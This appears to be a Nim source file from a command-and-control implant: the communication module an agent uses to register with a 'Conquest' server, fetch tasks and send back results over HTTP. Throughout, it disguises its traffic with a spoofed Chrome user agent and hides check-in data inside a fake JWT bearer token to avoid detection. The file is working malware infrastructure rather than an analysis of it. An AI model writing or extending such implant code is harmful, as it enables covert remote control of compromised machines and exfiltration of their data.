import httpclient, json, strformat, strutils, asyncdispatch, base64

import ../../common/[types, utils]

const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

proc register*(config: AgentConfig, registrationData: seq[byte]): bool {.discardable.} = 

    let client = newAsyncHttpClient(userAgent = USER_AGENT)
    
    # Define HTTP headers
    client.headers = newHttpHeaders({ 
        "Content-Type": "application/octet-stream",
        "Content-Length": $registrationData.len
    })

    let body = registrationData.toString()

    try:
        # Register agent to the Conquest server
        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/register", body)    
    
    except CatchableError as err:
        echo "[-] [register]:", err.msg
        quit(0)

    finally:
        client.close()

    return true

proc getTasks*(config: AgentConfig, checkinData: seq[byte]): string = 

    let client = newAsyncHttpClient(userAgent = USER_AGENT)
    var responseBody = ""

    # Define HTTP headers
    # The heartbeat data is placed within a JWT token as the payload (Base64URL-encoded)
    let payload = encode(checkinData, safe = true).replace("=", "")
    client.headers = newHttpHeaders({ 
        "Authorization": fmt"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{payload}.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30"
    })

    try:
        # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
        responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/tasks")
        return responseBody
    
    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] [getTasks]: " & err.msg 
    
    finally:
        client.close()

    return ""

proc postResults*(config: AgentConfig, resultData: seq[byte]): bool {.discardable.} = 
    
    let client = newAsyncHttpClient(userAgent = USER_AGENT)

    # Define headers
    client.headers = newHttpHeaders({ 
        "Content-Type": "application/octet-stream",
        "Content-Length": $resultData.len
    })
    
    let body = resultData.toString()

    echo body

    try:
        # Send binary task result data to server
        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/results", body)
    
    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] [postResults]: " & err.msg
        return false
    finally:
        client.close()

    return true